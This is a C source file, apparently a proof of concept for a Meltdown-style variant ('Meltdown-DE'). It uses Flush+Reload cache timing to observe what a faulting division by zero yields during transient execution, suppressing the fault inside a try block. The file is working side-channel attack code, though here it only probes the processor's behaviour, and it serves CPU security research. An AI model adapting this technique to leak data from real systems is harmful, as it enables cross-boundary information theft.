#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "libcache/cacheutils.h"

volatile int d = 0;

int main(void) {
  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char*) malloc( pagesize * 256 );
  memset(mem, 1, pagesize * 256);
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // Flush our shared memory
  flush_shared_memory();

  printf("Output legend:\n");
  printf("  '3'.....Division sets register to 0\n");
  printf("  'd'.....Division does not change register\n\n");
  
  for(int r = 0; r < 1000000; r++) {
    if(try_start()) {
      // Null pointer access makes attack better
      maccess(0);
      // Encode result of division in the cache
      maccess(mem + ('1' / d + '3') * 4096);
      
      try_abort();
    }
    try_end();

    // Recover data from the cache
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if(flush_reload(mem + mix_i * pagesize)) {
        printf("%c ", mix_i);
        fflush(stdout);
      }
    }
    sched_yield();
  }

  printf("Meltdown-DE done!\n");
  free(mem);

  return EXIT_SUCCESS;
}
